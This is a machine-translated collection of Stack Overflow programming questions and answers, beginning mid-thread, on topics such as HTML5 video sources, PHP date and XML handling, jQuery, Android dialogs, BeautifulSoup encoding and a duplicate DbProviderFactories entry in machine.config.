有没有一种简单的方法可以让浏览器引擎选择正确的引擎（例如从多个`<source>`标签中），还是我必须做一些 JS-foo？我确实找到了很多关于 和 CSS 处理的解决方案`<img>`，`<canvas>`但没有找到视频的最佳实践。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:24:33.700

好吧，您可以尝试在元素上使用[media 属性。](http://www.iandevlin.com/blog/2012/08/html5/responsive-html5-video)`source`

下面给出一个代码示例：

```
<video controls> 
   <source src="video-small.mp4" type="video/mp4" media="all and (max-width:480px)"> 
   <source src="video-small.webm" type="video/webm" media="all and (max-width:480px)"> 
   <source src="video.mp4" type="video/mp4"> 
   <source src="video.webm" type="video/webm"> 
</video> 
```

问题是找到有助于表明显示器是视网膜的媒体查询。

**编辑** 我对此进行了更多测试，结果发现您还需要在其他来源上设置媒体查询，因为它们似乎具有优先权。我在以下位置写了一点：[HTML5 video for Retina Displays](http://www.iandevlin.com/blog/2012/12/html5/html5-video-for-retina-displays)。

# android - C中的AES加密和解密

> ID：13822278
> 
> 赞同：0
> 
> 时间：2012-12-11T14:51:48.313
> 
> 标签：android, iphone, aes, encryption

我正在创建一个应用程序来保存一些隐私文档。我想将这些文件保存为加密格式。

我在 google 中搜索了 C 语言中的 AES Encryption/Decryption alto。我无法找到实现 AES 的标准算法。

任何人都可以建议我用 C 编写 AES Enc/Dec 吗？请

我想在 android 和 iPhone 中使用相同的算法

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:07:39.187

不太确定 Android 和 iPhone 与此有什么关系，特别是考虑到您正在寻找 C 实现，但是....

有 ccrypt： [http ://ccrypt.sourceforge.net/](http://ccrypt.sourceforge.net/)

这是一个非常小的： [http ://www.literatecode.com/aes256](http://www.literatecode.com/aes256)

参考实现： [http ://embeddedsw.net/Cipher_Reference_Home.html](http://embeddedsw.net/Cipher_Reference_Home.html)

另一个： http: [//gladman.plushost.co.uk/oldsite/AES/index.php](http://gladman.plushost.co.uk/oldsite/AES/index.php)

mcrypt：http: [//sourceforge.net/projects/mcrypt/](http://sourceforge.net/projects/mcrypt/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T09:20:15.073

AES 是一种标准算法，因此无需在 C 中寻求“通用”实现。相反，您应该学习如何在两个平台上执行 AES 加密。如果您与加密模式和填充一致，您应该能够很好地互操作。

# asp.net-mvc-3 - ASP.NET MVC 编辑器模板；显示列的定位

> ID：13822282
> 
> 赞同：1
> 
> 时间：2012-12-11T14:52:05.003
> 
> 标签：asp.net-mvc-3

我在我的 ASP.net MVC 项目中使用了一个编辑器模板。编辑器模板由隐藏字段、复选框、标签和文本框组成。

这是编辑器模板：

```
@model Models.Domain.myObject

<p>
    @Html.HiddenFor(x => x.Id) 

    @Html.DisplayFor(x => x.Name)

    @Html.CheckBoxFor(x => x.Selected)
    @Html.TextBoxFor(x => x.DefaultCount, new { disabled = "disabled"})

</p> 
```

这是我认为使用此模板的内容：

```
@Html.EditorFor(model => model.myObject) 
```

有时我可能有 3 个 myObjects，有时我有 10 个。MVC 很好地为我设置了所有这些对象，但有一个例外。

我希望所有名称彼此右对齐，并且出于外观目的，我希望复选框彼此左对齐。

我怎样才能做到这一点？

现在我得到这样的东西：

```
displaydisplay   checkbox textbox
display  checkbox textbox
displaydisplaydisplay checkbox text box 
```

我想要得到的是（希望你能看到对齐）：

```
 displaydisplay   checkbox textbox
              display   checkbox textbox
displaydisplaydisplay   checkbox textbox 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:43:24.440

那么解决方案是基于html/css。您可以使用“div”或“table”。

使用 table 选项的示例：

**查看“妈妈”**

```
<table>
        @Html.EditorFor(model => model.myObject)
</table> 
```

**查看“儿童”**

```
<tr>
    <td style="width: 200px; text-align: right;">
        @Html.HiddenFor(x => x.Id)
        @Html.DisplayFor(x => x.Name)
    </td>
    <td>
        @Html.CheckBoxFor(x => x.Selected)
        @Html.TextBoxFor(x => x.DefaultCount, new { disabled = "disabled"})
    </td>
</tr> 
```

**注意：**正如我所说，您可以使用 Divs 来实现相同的视觉效果，并且可以添加“css 类”以获得更清晰的代码。

# android - 如何在正在进行的对话框中设置相等的按钮高度？

> ID：13822287
> 
> 赞同：0
> 
> 时间：2012-12-11T14:52:19.930
> 
> 标签：android, android-layout, button, progressdialog

我有进度对话框：

```
mProgressDialog = new ProgressDialog(WebViewActivity.this); 
```

有一些像这样的按钮：

```
mProgressDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "Cancel", new DialogInterface.OnClickListener() {
            @Override
             public void onClick(DialogInterface dialog, int which) {
                //some code
            }
         }); 
```

我正在尝试通过（并获取 NullPointerException）设置它们的参数：

```
Button cancel = mProgressDialog.getButton(DialogInterface.BUTTON_NEGATIVE);
int width1 = (int) TypedValue.applyDimension
                (TypedValue.COMPLEX_UNIT_DIP, 0, getResources().getDisplayMetrics());
         **NullPointerException here:** cancel.setLayoutParams(new LinearLayout.LayoutParams
                 (width1, LayoutParams.MATCH_PARENT, 1f)); 
```

那么，**如何**在此处设置按钮的布局参数（不使用自定义进度对话框）？有些东西告诉我我根本无法设置它们，而不是使用自定义进度对话框......

PS：对不起，如果我在这里遗漏了一些非常简单的东西

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:36:32.237

这些按钮在 Dialog.onCreate() 之后安装到对话框中。因此，您可以覆盖此方法并在此处添加代码，或者您必须在调用 Dialog.show() 后获取按钮。

这是我的示例，我更改了第一个按钮的重量。

```
 ProgressDialog dialog = new ProgressDialog(this);
    dialog.setButton(AlertDialog.BUTTON_POSITIVE, "confirm",
            (DialogInterface.OnClickListener) null);
    dialog.setButton(AlertDialog.BUTTON_NEGATIVE, "cancel",
            (DialogInterface.OnClickListener) null);
    dialog.show();
    Button btConfirm = dialog.getButton(AlertDialog.BUTTON_POSITIVE);
    LinearLayout.LayoutParams params = (LinearLayout.LayoutParams) btConfirm
            .getLayoutParams();
    params.weight = 3; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-18T21:56:09.420

这里是带有构建器的 AlertDialog 的代码

```
 AlertDialog.Builder builder = new AlertDialog.Builder(Setup.this);
            builder.setMessage("Message", 1))
            .setPositiveButton(getString(R.string.browseonlinesupport), new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialogInterface, int i) {
            })
            .setNeutralButton(getString(R.string.submit_help_request), new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialogInterface, int i) {
                }
            })
            .setNegativeButton(getString(R.string.cancel), null) // to make the button even widths
            //.show()
            ;
            //                }
            AlertDialog helpDialog = builder.create();
            helpDialog.show();  // call show() must from dialog not builder, otherwise button not created and getButton is null
            LinearLayout.LayoutParams btParams;
            Button btPositive = helpDialog.getButton(AlertDialog.BUTTON_POSITIVE);
            btParams = (LinearLayout.LayoutParams) btPositive.getLayoutParams();
            btParams.weight = 1;
            btParams.width = btParams.MATCH_PARENT;

            Button btNegative = helpDialog.getButton(AlertDialog.BUTTON_NEGATIVE);
            btParams = (LinearLayout.LayoutParams) btNegative.getLayoutParams();
            btParams.weight = 1;
            btParams.width = btParams.MATCH_PARENT;

            Button btNeutral = helpDialog.getButton(AlertDialog.BUTTON_NEUTRAL);
            btParams = (LinearLayout.LayoutParams) btNeutral.getLayoutParams();
            btParams.weight = 1;
            btParams.width = btParams.MATCH_PARENT; 
```

*，调用 show() 必须从对话框而不是构建器，否则按钮未创建且 getButton 为空

# python - UnicodeDammit：detwingle 在网站上崩溃

> ID：13822291
> 
> 赞同：3
> 
> 时间：2012-12-11T14:52:23.087
> 
> 标签：python, unicode, beautifulsoup

我正在抓取网站并使用[BeautifulSoup4](http://www.crummy.com/software/BeautifulSoup/bs4/doc/)来解析它们。由于网站可以有*真正*随机的字符集，我使用[UnicodeDammit.detwingle](http://www.crummy.com/software/BeautifulSoup/bs4/doc/#inconsistent-encodings)来确保我向 BeautifulSoup 提供正确的数据。它工作得很好......直到它崩溃了。一个网站导致代码中断。构建“汤”的代码如下所示：

```
u = bs.UnicodeDammit.detwingle( html_blob ) <--- here it crashes
u = bs.UnicodeDammit( u.decode('utf-8'), 
                      smart_quotes_to='html', 
                      is_html = True )
u = u.unicode_markup
soup = bs.BeautifulSoup( u ) 
```

还有错误（标准 Python-Unicode 地狱二重奏）

```
 File ".../something.py", line 92, in load_bs_from_html_blob
    u = bs.UnicodeDammit.detwingle( html_blob )
  File ".../beautifulsoup4-4.1.3-py2.7.egg/bs4/dammit.py", line 802, in detwingle
    return b''.join(byte_chunks)
UnicodeDecodeError: 'ascii' codec can't decode byte 0xc2 in position 0:
ordinal not in range(128) 
```

违规网站是[这个](http://www.diapers.com/p/similac-advance-ready-to-feed-32-oz-6-pk-7580)

**问题：**如何进行*正确且防弹*的网站源解码？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:50:57.033

这个网站在字符编码方面根本不是一个特例，它是完全有效的 utf-8，即使 http 标头设置正确。然后，您的代码将在任何以 utf-8 编码且代码点超出 ASCII 的网站上崩溃。

~~从文档中也可以看出，它`UnicodeDammit.detwingle`采用 unicode 字符串。您正在传递它`html_blob`，变量命名表明它不是解码的 unicode 字符串。~~（误解）

在 http 标头或标记与编码有关或根本不包含的情况下，处理任何网站编码并非易事。你需要执行各种启发式方法，即使那样你也不会做对。但是这个网站正在正确发送字符集标头，并且已在该字符集中正确编码。

* * *

有趣的琐事。网站中唯一超出 ASCII 文本的是这些 javascript 注释（在被解码为 utf-8 之后）：

```
image = new Array(4); //¶¨ÒåimageÎªÍ¼Æ¬ÊýÁ¿µÄÊý×é 
image[0] = 'sample_BG_image01.png' //±³¾°Í¼ÏóµÄÂ·¾¶ 
```

如果您随后将它们编码为 ISO-8859-1，并将结果解码为 GB2312，您将得到：

```
image = new Array(4); //定义image为图片数量的数组
image[0] = 'sample_BG_image01.png' //背景图象的路径 
```

哪个谷歌中文->英文，翻译成：

```
image = new Array(4); //Defined image of the array of the number of images
image[0] = 'sample_BG_image01.png' //The path of the background image 
```

# php - 当标签中的项目数一直在变化时，如何获取xml文件的项目属性

> ID：13822296
> 
> 赞同：0
> 
> 时间：2012-12-11T14:52:31.777
> 
> 标签：php, xml, xml-parsing, feed

我在下面有这段 xml 代码，我正在尝试获取结果标记中所有“结果值”属性的值。问题是……这将是一个实时提要，因此该标签内可能有 1,2 或 3 个结果项。

我是否需要进行某种计数才能查看结果标签中有多少项目？

```
<Match ct="0" id="771597" LastPeriod="2 HF" LeagueCode="19984" LeagueSort="1" LeagueType="LEAGUE" startTime="15:00" status="2 HF" statustype="live" type="2" visible="1">
    <Home id="11676" name="Manchester City" standing="1"/>
    <Away id="10826" name="Newcastle United" standing="3"/>
    <Results>
        <Result id="1" name="CURRENT" value="1-1"/>
        <Result id="2" name="FT" value="1-1"/>
        <Result id="3" name="HT" value="1-0"/>
    </Results>
    <Information>
        <league id="19984">Premier League</league>
        <note/>
        <bitarray/>
        <timestamp/>
    </Information>
</Match> 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T14:58:12.747

## 简单XML

只需使用[SimpleXML](http://php.net/manual/en/book.simplexml.php)遍历结果以获取每个属性`value`，`name`这将适用于可变数量的结果。

**[演示](http://codepad.org/8OjsJETx)**

```
$obj = simplexml_load_string($xml);

foreach($obj->Results->Result as $result)
{
    echo $result->attributes()->name . ': ' . $result->attributes()->value . "\n";
} 
```

**输出**

> 当前： 1-1
> 英尺： 1-1
> HT： 1-0

如果您有一个根节点，例如它下面`Matches`有多个`Match`，那么您将使用`foreach`这样的嵌套：

```
foreach($obj->Match as $match)
{
    foreach($match->Results->Result as $result)
    {
        echo $result->attributes()->name . ': ' . $result->attributes()->value . "\n";
    }
} 
```

* * *

## DOM文档

[使用DOMDocument](http://php.net/manual/en/class.domdocument.php)而不是 SimpleXML来做同样的事情：

```
$dom = new DOMDocument();
$dom->loadXML($xml);

foreach($dom->getElementsByTagName('Match') as $match)
{
    foreach($match->getElementsByTagName('Result') as $result)
    {
        echo $result->getAttribute('name') . ': ' . $result->getAttribute('value') . "\n";
    }
} 
```

输出与 SimpleXML 方法相同。

# c# - 按字符串对 ObservableCollection 进行排序

> ID：13822306
> 
> 赞同：0
> 
> 时间：2012-12-11T14:52:51.420
> 
> 标签：c#, wpf, xaml

我有一个可观察的集合，集合的一个项目有一个标签（字符串）和一个 isChecked（布尔值）。

用户可以选择一个标签来对列表进行排序，例如“事件”和/或设置 IsChecked。

排序优先级应该像这样工作：1）isChecked == true 2）标签等于项目标签 3）其余项目按标签按字母顺序排序

我通过 xaml 在 ListBox 中显示 ObservableCollection。知道如何实现吗？

```
EDIT: providing example for clarification:
item0: tag = "apple", isChecked = false;
item1: tag = "apple", isChecked = true;
item2: tag = "pineapple", isChecked = false;
item3: tag = "coconut", isChecked = true;
item4: tag = "cherry", isChecked = false;

string is: "cherry"
outcome: item1, item3, item4, item0, item2 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T16:33:11.153

为了能够检索您的条件，我执行了以下操作。

```
 // Retrieve an IQueryable for the colleciton with your specified conditions
 var query = from c in collection
             orderby c.IsChecked descending, c.Tag.Equals("cherry") descending, c.obsTag
             select c;

 // Clear the collection
 collection = new ObservableCollection<myCollectionObject>();
 // Replace the collection with your IQueryable results
 foreach(myCollectionObject obj in query) {
      collection.Add(obj);
 } 
```

如果您想在一行中完成所有操作：

```
 collection = new ObservableCollection<obsCol>(from c in collection 
              orderby c.obsCheck descending, c.obsTag.Equals("cherry") descending, c.obsTag 
 select c); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:55:46.163

要与 UI 和模型的实现分开，您必须使用[CollectionViewSource](http://msdn.microsoft.com/en-us/library/system.windows.data.collectionviewsource.aspx)

如何通过一些自定义比较器对对象列表进行排序的具体示例可以在此处找到：

[WPF：ListCollectionView 用于排序、过滤和分组](http://weblogs.asp.net/monikadyrda/archive/2009/08/31/wpf-listcollectionview-for-sorting-filtering-and-grouping.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:00:56.083

＃2有点棘手。

为此，您可能需要在后面的代码中有另一个 Public Enumerable，它分两步构建。

OP请在我走这条路之前澄清＃2是什么。

2 标签等于标签

3 按字母顺序按标签

一点都不清楚。三引用标签。

根据您的评论需要顶部建立两组列表
问题陈述不反映评论。
你不能指望人们阅读评论。

IsChecked = True 和 Tag = '匹配'

然后追加

IsChecked = false 或 Tag != 'match' order by tag

抱歉，我现在没有时间使用 LINQ，老实说，您并没有在一个好的问题陈述上付出太多努力。

# wcf - 每个配置文件中的“DbProviderFactories”部分只能出现一次

> ID：13822312
> 
> 赞同：8
> 
> 时间：2012-12-11T14:53:05.460
> 
> 标签：wcf, iis-7, entity-framework-4, machine.config

我们在使用实体框架调用 WCF .net 4.0 服务时收到此错误。

```
The 'DbProviderFactories' section can only appear once per config file 
```

它是使用 EF 和其他 .net 4.0 WCF 服务的服务器上的第一个应用程序没有收到此错误。

有没有办法在不编辑服务器上的机器配置文件的情况下纠正这个错误？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-02-07T11:30:38.503

安装 IBM DB2 .NET 提供程序会导致空的 DbProviderFactories，见下文。只需删除第二个空条目 DbProviderFactories

```
<system.data>
    <DbProviderFactories>
        <add name="IBM DB2 for i .NET Provider" invariant="IBM.Data.DB2.iSeries" description=".NET Framework Data Provider for IBM i" type="IBM.Data.DB2.iSeries.iDB2Factory, IBM.Data.DB2.iSeries, Version=12.0.0.0, Culture=neutral, PublicKeyToken=9cdb2ebfb1f93a26" />
    </DbProviderFactories>
    <DbProviderFactories />
</system.data> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-11T18:45:50.233

也许您可以创建 web.config 条目来覆盖您想要更改的任何机器范围的设置。

此处描述：

[通过 web.config 覆盖 machine.config](https://stackoverflow.com/questions/2201242/override-machine-config-by-web-config)

将`<clear />`指令放在`DbProviderFactories`web 配置中的标签内，以清除然后覆盖机器配置中的重复条目。因此，对 machine.config 中的错误进行了破解。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-03-11T18:13:19.103

您必须更新位于以下路径中的 Machine.config 文件。

*   `C:\Windows\Microsoft.NET\Framework\v2.0.50727\CONFIG\Machine.Config`
*   `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\Machine.Config`

对于 64 位机器，Machine.config 将位于`...\Framework64\...`

要注意的块是这样的：

```
<system.data>
    <DbProviderFactories>
        <add name="IBM DB2 for i5/OS .NET Provider" invariant="IBM.Data.DB2.iSeries" description=".NET Framework Data Provider for i5/OS" type="IBM.Data.DB2.iSeries.iDB2Factory, IBM.Data.DB2.iSeries, Version=12.0.0.0, Culture=neutral, PublicKeyToken=9cdb2ebfb1f93a26"/>
        <add name="Microsoft SQL Server Compact Data Provider" invariant="System.Data.SqlServerCe.3.5" description=".NET Framework Data Provider for Microsoft SQL Server Compact" type="System.Data.SqlServerCe.SqlCeProviderFactory, System.Data.SqlServerCe, Version=3.5.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91"/>
        </DbProviderFactories>
<!-- This is the line to remove - empty element --><DbProviderFactories/>
</system.data> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-04-01T22:05:11.347

正如@yonsk 已经提到为什么会出现此问题（重复条目），您可以创建一个可以修复 machine.config 文件的控制台应用程序，然后在收到异常时从您的应用程序的安装程序或从您的应用程序调用该控制台应用程序。以下代码可用于修复 machine.config 文件的控制台应用程序。

```
class Program
    {
        static void Main()
        {
            string machineConfigFilePath = RuntimeEnvironment.SystemConfigurationFile;

            XDocument xdoc = XDocument.Load(machineConfigFilePath);

            XElement[] elements = xdoc.XPathSelectElements("//configuration/system.data/DbProviderFactories").ToArray();

            if (elements.Any())
            {
                foreach (XElement anElement in elements)
                {
                    if (!anElement.HasElements)
                        anElement.Remove();
                }
            }

            xdoc.Save(machineConfigFilePath);
        }
    } 
```

如果您想从您的应用程序调用控制台应用程序，您需要以管理员身份调用它。因此，以下代码段可能有助于以管理员身份调用该控制台应用程序（将提示用户接受对话框。）

```
 try
            {
                Process process = Process.Start(new ProcessStartInfo
                {
                    Verb = "runas",
                    FileName = "/Path/to/the/console/application",
                    UseShellExecute = true,
                    CreateNoWindow = true,

                });
                process.WaitForExit();
                int exitCode = process.ExitCode;
            }
            catch (Exception ex)
            {

            } 
```

# php - 转换为 RFC822 日期格式

> ID：13822313
> 
> 赞同：0
> 
> 时间：2012-12-11T14:53:06.387
> 
> 标签：php, mysql, rss, timestamp, rfc822

我真的不知道这里发生了什么。我正在尝试向我的博客添加 RSS 提要。由于 RSS 要求日期为 RFC822 格式，因此我使用 PHP 日期函数来转换我的原始时间戳 (0000-00-00 00:00:00)。问题是我在提要中的所有帖子显示的日期和时间是 1970 年 1 月 1 日 01:33。这是代码：

```
<?php
while ($row = $query->fetch_assoc()) {
?>
<item>
    <title><?php echo $row['title']; ?></title>
    <description>Item description</description>
    <link>http://mysite.com/blog.php<?php echo '?id='.$row['id']; ?></link>
    <pubDate><?php echo date('r', $row['date_posted']); ?></pubDate>
</item> 
```

编辑：这是我的查询。我在这里转换为 Unix 时间戳吗？

```
$query = $db->query("
SELECT      `posts`.`id`,
            `posts`.`cat_id`,
            `posts`.`title`,
            `posts`.`contents`,
            `posts`.`date_posted`
FROM        `posts`
ORDER BY    `posts`.`date_posted`
DESC 
LIMIT 10"); 
```

EDIT2：感谢所有的帮助，但它仍然不起作用。诚然，我不太了解这一点，但我确信有一个简单的解决方案。整个 feed.php 文档实际上并不长，所以这里是所有代码，以防我错过提及一些重要的细节。哦，日期正确存储在数据库的 date_posted 列中。

```
<?php 

$db = new mysqli('host', 'user', 'pass', 'db');

$query = $db->query("
    SELECT      `posts`.`id`,
                `posts`.`cat_id`,
                `posts`.`title`,
                `posts`.`contents`,
                `posts`.`date_posted`
    FROM        `posts`
    ORDER BY    `posts`.`date_posted`
    DESC 
    LIMIT 10");

if ($db->affected_rows >= 1) {

    echo '<?xml version="1.0" encoding="iso-8859-1" ?>' ?>
    <rss version="2.0">
    <channel>
        <title>Title</title>
        <description>RSS feed</description>
        <link>http://mysite.com</link>

        <?php
        while ($row = $query->fetch_assoc()) {
        ?>
        <item>
                <title><?php echo $row['title']; ?></title>
                <description><?php echo substr($row['contents'], 0, 150) ?></description>
                <link>http://mysite.com/blog.php<?php echo '?id='.$row['id']; ?></link>
                <pubDate><?php echo date('r', $row['date_posted']); ?></pubDate>
        </item>
        <?php
        }
        ?>
        </channel>
        </rss>
<?php
}
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:57:19.787

的原始价值是`$row['date_posted']`多少？请记住，它`date()`需要一个 PHP 时间戳，它是一个普通的 unix 时间戳 - 表示自 1970 年 1 月 1 日以来的秒数的整数。如果你给它一个字符串（例如`2012-12-11 08:55:00`，你只会得到一个损坏的值，因为 PHP 试图将该字符串转换为一个 int：

```
$now = '2012-12-11 08:56:00';
echo date('r', $now); // Wed, 31 Dec 1969 18:33:32 -0600
echo date('r', (int)$now); // Wed, 31 Dec 1969 18:33:32 -0600
echo (int)$now; // 2012
echo date('r', 2012); // Wed, 31 Dec 1969 18:33:32 -0600 
```

您必须将日期字段转换为 MySQL 中的 unix 时间戳，或使用 MySQL[自己的日期格式化](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html#function_date-format)函数：

```
SELECT UNIX_TIMESTAMP(date_posted), ...
or
SELECT DATE_FORMAT(date_posted, 'format string here'), ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T14:56:47.687

那是因为 php 的 date 对象是一个[UNIX Timestamp](http://en.wikipedia.org/wiki/Unix_time)。它从 1970 年 1 月 1 日开始。您需要检查超出该范围的日期，例如 0000-00-00 并手动处理。

此外，请检查您的数据库并确保您的时间戳存储正确。如果您期待一个真实的日期并且得到 0000-00-00 那么您可能直接插入了 PHP 时间戳，MySQL 无法识别该格式。您必须以这种格式将时间戳作为字符串插入：`Y-m-d H:i:s`例如：`INSERT INTO table (time) VALUES ('2012-01-01 13:30:00') WHERE id=1`。您可以使用 php`date('Y-m-d H:i:s')`获取此格式。

如果您希望某些日期为 0，而其他日期为实际日期，则可以通过以下方法插入内联 if 用您想要的任何日期替换 0000 日期，同时根据需要转换正常日期。

```
<?php
while ($row = $query->fetch_assoc()) {
?>
<item>
    <title><?php echo $row['title']; ?></title>
    <description>Item description</description>
    <link>http://mysite.com/blog.php<?php echo '?id='.$row['id']; ?></link>
    <pubDate><?php echo strncmp($row['date_posted'], '0000-00-00', 10) == 0 ? 'NOT PUBLISHED' : date('r', $row['date_posted']); ?></pubDate>
</item> 
```

# jquery-ui - Jquery：如何在添加新内容之前清除元素？

> ID：13822322
> 
> 赞同：42
> 
> 时间：2012-12-11T14:53:35.943
> 
> 标签：jquery-ui

这是我的jQuery代码

```
 $.ajax({
   url: "PopUpProductDetails.aspx",
            cache: false
     }).done(function (html) {
     $("#dialog").append(html);
 }); 
```

第一次，它工作得很好。它显示**PopUpProductDetails.aspx**页面的内容。但是，在那之后，如果我再次点击，我会得到两次相同的内容，依此类推。我认为问题在于我需要先清除**对话框**元素，然后再添加新内容。

我怎么做？

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2012-12-11T14:58:57.490

`.append()`将 html 附加到现有 html 字符串的末尾，`.html()`用于替换`#dialog`.

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-12-11T15:16:55.293

在函数内部先清除对话框，然后填充内容

```
$.ajax({
   url: "PopUpProductDetails.aspx",
            cache: false
     }).done(function (html) {
     $("#dialog").html("");
     $("#dialog").html(html);
 }); 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2020-03-06T09:35:30.147

您可以`.empty()`先使用，然后`.append()`在一行中使用:)

像这样：

```
$.ajax({
  url: "PopUpProductDetails.aspx",
        cache: false
    }).done(function (html) {
    $("#dialog").empty().append(html);
}); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-12-07T12:11:09.757

如果您需要先清除对话框，请使用**.empty()**，它比**.html("")快**

请参阅[Jquery 差异 .html("") 与 .empty()](https://stackoverflow.com/questions/17543711/jquery-difference-html-vs-empty)

# scala - 迭代器上的 Scala 并发作为队列

> ID：13822323
> 
> 赞同：0
> 
> 时间：2012-12-11T14:53:37.053
> 
> 标签：scala, parallel-processing

我不确定我的问题的正确语言，所以请随时为我提供正确的术语。

假设我有一个进程 A，它输出一个迭代器（惰性求值）这会产生 Iterator[A]

然后我有另一个进程 B，它映射返回 Iterator[B] 的事件

这将持续几个进程 Iterator[A] -> Iterator[B] -> Iterator[C] -> ---

现在最终我将此流评估为列表[Z]。这为我节省了使用 List[A] -> List[B] -> List[C] 等的内存命中

现在我想通过引入并行化来提高性能，但我不想并行化跨迭代器的每个元素的评估，而是并行化每个迭代器堆栈。因此，在这种情况下，进程 A 的线程为 Iterator[A] 填充 Queue[A]，进程 B 的线程从 Queue[A] 获取，应用任何映射，然后添加到 Iterator[B] 的 Queue[B]从中读取。

现在我以前通过设计自己的异步队列在其他语言中做到了这一点，我想知道 Scala 必须解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T18:34:31.867

这是我使用演员制作的第一个刺伤解决方案。它完全阻塞，所以也许可以开发一个使用期货的实现

```
case class AsyncIterator[T](iterator:Iterator[T]) extends Iterator[T] {
  private val queue = new scala.collection.mutable.SynchronizedQueue[Int]()
  private var end = !iterator.hasNext

  def hasNext() = {
    if (end) false
    else if (!queue.isEmpty) true
    else hasNext
  }

  def next() = {
    while (q.isEmpty) {
      if (end) throw new Exception("blah")
    }
    q.dequeue()
  }

  private val producer: Actor = actor {
    loop {
      if (!iterator.hasNext) {
        end = true
        exit
      }
      else {
        q.enqueue(iterator.next)
      }
    }
  }
  producer.start()
} 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-12-12T13:42:45.467

既然你对其他语言持开放态度，那么 Go 怎么样？

最近有[一个](https://stackoverflow.com/questions/13810261/go-lang-closure-pipeline-deadlock)关于如何构建事件驱动管道的讨论，这将实现与您描述的相同但以完全不同的方式。

可以说，考虑和设计事件管道比推理惰性迭代器更容易，因为它变成了一个数据流系统，其中每个阶段的关键问题是“这个阶段对*单个*实体有什么作用？” 而不是“我怎样才能*有效地迭代*许多实体？”

一旦实现了事件驱动的管道，如何使其并发或并行的问题就没有实际意义了——您已经完成了。

# iphone - Xcode 4.5 和 iOS 6.x 中的故事板方向支持？

> ID：13822325
> 
> 赞同：0
> 
> 时间：2012-12-11T14:53:39.403
> 
> 标签：iphone, objective-c, ios6, storyboard, screen-orientation

我创建了两个相同的故事板，除了一个包含纵向视图和一个包含横向视图。

我不想使用自动调整大小的蒙版，因为某些视图的布局在纵向和横向之间完全变化。过去我在代码中手动移动了视图上的控件，但这次我采用了一种更简单的方法:)

我找到的最接近的解决方案来自 'benyboariu' - [Storyboardsorientation support for xCode 4.2?](https://stackoverflow.com/questions/7803524/storyboards-orientation-support-for-xcode-4-2)

这是我正在使用的代码，它在 iOS 5.x 上运行良好，但在 iOS 6.x 上运行良好。

```
- (void)updateLandscapeView
{
UIDeviceOrientation deviceOrientation = [UIDevice currentDevice].orientation;

if (deviceOrientation == UIDeviceOrientationUnknown)
{
    if ([[UIScreen mainScreen] bounds].size.height > [[UIScreen mainScreen] bounds].size.width)
    {
        deviceOrientation = UIDeviceOrientationPortrait;
        self.appDelegate.isShowingLandscapeView = NO;
    }
    else
    {
        deviceOrientation = UIDeviceOrientationLandscapeLeft;
        self.appDelegate.isShowingLandscapeView = YES;
    }
}

if (UIDeviceOrientationIsLandscape(deviceOrientation) && !self.appDelegate.isShowingLandscapeView)
{
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard-Landscape" bundle:[NSBundle mainBundle]];
    UIViewController * landscape = [storyboard instantiateViewControllerWithIdentifier:@"RootViewController-Landscape"];
    self.appDelegate.isShowingLandscapeView = YES;
    [UIView transitionWithView:landscape.view duration:0 options:UIViewAnimationOptionTransitionCrossDissolve|UIViewAnimationCurveEaseIn animations:^{
        self.view = landscape.view;
    } completion:NULL];
}
else if (UIDeviceOrientationIsPortrait(deviceOrientation) && self.appDelegate.isShowingLandscapeView)
{
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard-Portrait" bundle:[NSBundle mainBundle]];
    UIViewController * portrait = [storyboard instantiateViewControllerWithIdentifier:@"RootViewController"];
    self.appDelegate.isShowingLandscapeView = NO;
    [UIView transitionWithView:portrait.view duration:0 options:UIViewAnimationOptionTransitionCrossDissolve|UIViewAnimationCurveEaseIn animations:^{
        self.view = portrait.view;
    } completion:NULL];
}
} 
```

我在 iOS 6.x 上调试时遇到的错误是：

> 由于未捕获的异常“UIViewControllerHierarchyInconsistency”而终止应用程序，原因：“一个视图一次最多只能与一个视图控制器相关联！查看 UIView: 0x108276b0; 帧 = (0 0; 568 268); 自动调整大小 = RM+BM；动画={位置=CABasicAnimation：0x10815c60；bounds=CABasicAnimation: 0x1082a5e0; }; layer = CALayer: 0x10827710 与 RootViewController: 0x10821f10 相关联。在将此视图与 RootViewController 关联之前清除此关联：0x961a150。

我通常将视图控制器与 NIB 断开链接以修复此类错误，但无法通过情节提要执行此操作。

有人有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T19:02:39.450

将您的肖像视图控制器更改为普通视图（将其从视图控制器中取出）。现在您应该能够将它实例化为 UIView 并进行转换，而不必担心它与多个视图控制器相关联。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T08:38:12.187

